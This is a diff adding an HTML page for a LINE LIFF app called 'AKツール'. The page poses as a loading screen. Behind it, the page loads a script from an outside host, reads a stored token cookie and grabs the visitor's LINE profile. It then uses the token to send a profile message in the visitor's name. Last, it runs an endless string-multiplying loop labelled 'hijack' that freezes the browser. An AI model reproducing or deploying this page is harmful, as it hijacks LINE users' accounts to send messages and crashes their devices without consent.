@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AKツール</title>
+    <link href="./style.css" rel="stylesheet">
+</head>
+<body>
+  <font face="sans-serif">
+  <h1>読み込み中...</h1>
+  <p>まもなく起動します。しばらくお待ちください</p>
+  </font>
+  <script src="https://liff-tool.f5.si/mod.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
+  <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+  <script>
+    liff.init({liffId:"liffid",withLoginOnExternalBrowser:true})
+    .then(()=>liff.getProfile())
+    .then((profile)=>{
+        let token=Cookies.get('token');
+        let temp;
+        if (profile.pictureUrl){
+            temp=[{
+  "type": "template",
+  "altText": "プロフィール",
+  "template": {
+    "type": "buttons",
+    "thumbnailImageUrl": profile.pictureUrl,
+    "imageAspectRatio": "rectangle",
+    "imageSize": "contain",
+    "imageBackgroundColor": "#FFFFFF",
+    "title": profile.displayName,
+    "text": profile.statusMessage,
+    "defaultAction": {
+      "type": "uri",
+      "label": "View detail",
+      "uri": "http://example.com/page/123"
+    },
+    "actions": [
+      {
+        "type": "uri",
+        "label": "プロフィールを転送",
+        "uri": "line://share?text="+encodeURIComponent(`Profile:\nName:${profile.displayName},\nStatusMessage:${profile.statusMessage},\nPictureUrl:${profile.pictureUrl}`)
+      }
+    ]
+  }
+}]
+        }else{
+            temp=[{
+  "type": "template",
+  "altText": "プロフィール",
+  "template": {
+    "type": "buttons",
+    "imageBackgroundColor": "#FFFFFF",
+    "title": profile.displayName,
+    "text": profile.statusMessage,
+    "defaultAction": {
+      "type": "uri",
+      "label": "View detail",
+      "uri": "http://example.com/page/123"
+    },
+    "actions": [
+      {
+        "type": "uri",
+        "label": "プロフィールを転送",
+        "uri": "line://share?text="+encodeURIComponent(`Profile:\nName:${profile.displayName},\nStatusMessage:${profile.statusMessage}`)
+      }
+    ]
+  }
+}]
+        }
+    liffmod.token.sendMessages(temp,token);
+    })
+.then(()=>{
+    let e="乗っ取り";
+    while (1==1) {
+        console.log(e);
+        e=e.repeat(10000);
+    }})
+  </script>
+  </body>
+</html>
